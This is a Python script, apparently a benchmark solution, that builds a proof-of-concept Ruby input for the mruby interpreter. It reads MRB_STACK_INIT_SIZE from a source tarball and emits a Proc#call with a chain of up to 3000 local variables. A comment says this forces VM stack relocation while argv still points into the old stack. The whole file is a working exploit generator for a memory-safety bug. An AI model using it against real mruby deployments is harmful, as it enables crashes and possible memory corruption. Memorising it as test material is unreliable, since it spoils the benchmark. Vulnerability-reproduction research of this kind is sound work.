import os
import re
import tarfile
import itertools
from typing import Optional, Iterable, Set


_RUBY_KEYWORDS: Set[str] = {
    "alias", "and", "begin", "break", "case", "class", "def", "defined", "do", "else", "elsif", "end",
    "ensure", "false", "for", "if", "in", "module", "next", "nil", "not", "or", "redo", "rescue",
    "retry", "return", "self", "super", "then", "true", "undef", "unless", "until", "when", "while",
    "yield",
}


def _iter_short_local_names(need: int, forbidden: Set[str]) -> Iterable[str]:
    letters = "abcdefghijklmnopqrstuvwxyz"
    produced = 0
    for length in range(1, 8):
        for tup in itertools.product(letters, repeat=length):
            name = "".join(tup)
            if name in forbidden:
                continue
            yield name
            produced += 1
            if produced >= need:
                return


def _extract_stack_init_size_from_tarball(src_path: str) -> Optional[int]:
    try:
        if not os.path.isfile(src_path):
            return None
        with tarfile.open(src_path, "r:*") as tf:
            candidates = []
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                bn = os.path.basename(m.name)
                if bn in ("state.c", "vm.c", "context.c", "mruby.h", "config.h", "mrubyconf.h"):
                    candidates.append(m)
            if not candidates:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.name.endswith((".c", ".h")):
                        candidates.append(m)
                        if len(candidates) >= 50:
                            break

            rx = re.compile(r"\bMRB_STACK_INIT_SIZE\b\s*(?:\(|)\s*(\d+)\s*(?:\)|)")
            for m in candidates:
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read(512 * 1024)
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    mm = rx.search(text)
                    if mm:
                        v = int(mm.group(1))
                        if 16 <= v <= 1_000_000:
                            return v
                except Exception:
                    continue
    except Exception:
        return None
    return None


def _make_ruby_poc(nvars: int, alloc_size: int) -> bytes:
    forbidden = set(_RUBY_KEYWORDS)
    forbidden.update({"s", "p", "x", "proc", "lambda", "f", "g"})

    names = list(_iter_short_local_names(nvars, forbidden))
    if len(names) < nvars:
        nvars = len(names)

    chain = "=".join(names) + "=0"
    # Use Proc#call (C-implemented) so argv points into VM stack; ensure stack relocation via big nregs and pre-allocation.
    src = f's="A"*{alloc_size};p=Proc.new{{|x|{chain};x}};p.call(1)\n'
    return src.encode("ascii", "strict")


class Solution:
    def solve(self, src_path: str) -> bytes:
        init_size = _extract_stack_init_size_from_tarball(src_path)
        if init_size is None:
            init_size = 128

        nvars = max(1400, init_size + 256)
        if nvars > 3000:
            # Keep runtime/memory reasonable; still typically forces an extend if init size isn't enormous.
            nvars = 3000

        alloc_size = 100000
        return _make_ruby_poc(nvars=nvars, alloc_size=alloc_size)